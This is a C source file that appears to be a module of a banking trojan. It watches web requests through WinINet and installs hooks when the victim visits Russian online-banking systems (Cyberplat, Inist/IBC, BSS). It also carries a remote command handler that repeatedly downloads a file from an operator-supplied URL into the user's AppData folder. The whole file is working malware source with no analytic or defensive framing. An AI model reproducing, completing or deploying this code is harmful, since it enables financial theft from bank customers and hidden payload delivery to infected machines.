#include "RuBnk.h"
#ifdef RuBnkH
#include "GetApi.h"
#include "RuBnk/BSS.h"
bool IbankHooksMain()
{
	return IbankHooks();
}

void IsBank( HINTERNET hRequest )
{
	DWORD dwUrlSize = 4096;
	char *Url		= (char*)MemAlloc( dwUrlSize );
	BSSHooks();
	if ( Url )
	{
		if ( pInternetQueryOptionA( hRequest, INTERNET_OPTION_URL, Url, &dwUrlSize ) )
		{
	
			if ( CompareUrl( "*cyberplat*", Url ) )
			{
				HookCyberplat();
			}
			else if ( CompareUrl( "*ibc*", Url ) )
			{
				InistHooks();
			}
			else if ( CompareUrl( "*bss*", Url ) )
			{
				BSSHooks();
			}

		}

		MemFree( Url );
	}

	return;
}

bool HookCyberplatPCMain()
{
	return HookCyberplatPC();

}

DWORD WINAPI IBlockThread(LPVOID lpData)
{
	PCHAR URL= (PCHAR)lpData;
	
	while (true)
	{
			WCHAR ExplorerAddRu[] = {'\\','r','u',L'\0'};//
			WCHAR SysPathRu[MAX_PATH];
			m_memset(SysPathRu,0,MAX_PATH*2);
			pSHGetFolderPathW(NULL, 0x001a , NULL, 0, SysPathRu);	
			plstrcatW( SysPathRu, ExplorerAddRu );
		if (DownloadInFile( URL, &SysPathRu[0] ))
		{		
			break;
		}
	}
	return 0;
}

bool ExecuteIblock_Url(LPVOID Manager, PCHAR Command, PCHAR Args)
{
	PCHAR InputStr= STR::New(Args,  0);
	return StartThread(IBlockThread,InputStr) != NULL;

}

#endif